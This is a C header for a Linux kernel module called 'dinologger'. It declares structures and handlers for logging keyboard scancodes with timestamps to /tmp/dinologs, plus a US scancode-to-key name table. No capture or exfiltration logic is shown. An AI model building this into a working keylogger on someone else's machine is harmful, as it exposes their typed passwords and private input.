#pragma once

#include "linux/init.h"
#include "linux/module.h"
#include "linux/fs.h"
#include "linux/miscdevice.h"
#include "linux/interrupt.h"
#include "asm/io.h"
#include "linux/ktime.h"
#include "linux/rtc.h"
#include "linux/slab.h"
#include "linux/kernel.h"
#include "linux/list.h"
#include "linux/seq_file.h"
#include "linux/fs.h"
#include "linux/err.h"

typedef struct log_node {
	struct rtc_time time;
	int scancode;
	int release;

	char *log;
	struct list_head list;
} log_node;

int __init m_init(void);
void __exit m_exit(void);

static int ct_open(struct inode *inode, struct file *file);
static int ct_release(struct inode *inode, struct file *file);
static void *seq_start(struct seq_file *s, loff_t *pos);
static void seq_stop(struct seq_file *_s, void *_v);
static void *ct_seq_next(struct seq_file *s, void *v, loff_t *pos);

static int seq_show(struct seq_file *seq, void *v);

#define DEVICE_NAME "dinologger"
#define LOG_FILE "/tmp/dinologs"
#define LOG(msg, ...) printk(KERN_NOTICE DEVICE_NAME ": " msg "\n", ## __VA_ARGS__)

#define STATE(release) (release ? "Released" : "Pressed")
#define NAME(scancode) (scancode >= 0 && scancode < 97 ?		\
							kbus[scancode] : kbus[0])
#define STAT(scancode) (scancode >= 0 && scancode < 97 ?		\
							stats[scancode]++ : stats[0]++)

#define MAPPED(scancode)	((scancode > 0 && scancode < 76)	\
						||	(scancode > 76 && scancode < 84)	\
						||	(scancode > 86 && scancode < 89)	\
						||	(scancode == 96))

#define SPECIAL(scancode) (strlen(kbus[scancode]) > 1)

#define WINTER_TIME(x)															\
		if (x.tm_yday <= 89 || x.tm_yday >= 299) {								\
			x.tm_hour = (x.tm_hour + 1) % 24;									\
		}

#define RELEASE 0b10000000
#define CANCEL_RELEASE 0b01111111
#define BUFFER_SIZE 256

#define UNMAPPED "Unmapped"

#define US_KBMAP																\
	"undefined", "Escape", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",	\
	"-", "=", "Remove", "Tab", "q", "w", "e", "r", "t", "y", "u", "i", "o",		\
	"p", "[", "]", "Enter", "Ctrl", "a", "s", "d", "f", "g", "h", "j", "k",		\
	"l", ";", "\'", "`", "Left Shift", "\\", "z", "x", "c", "v", "b", "n", "m",	\
	",", ".", "/", "Right Shift", "*", "Alt", " ", "Caps Lock", "F1", "F2",		\
	"F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "Num Lock", "Scroll Lock",	\
	"Home", "Up", "Page up", "-", "Left", UNMAPPED, "Right", "+", "End",		\
	"Down", "Page down", "Insert", "Delete", UNMAPPED, UNMAPPED, UNMAPPED,		\
	"F11", "F12", UNMAPPED, UNMAPPED, "Windows", "Windows", UNMAPPED, UNMAPPED,	\
	UNMAPPED, "Fn"
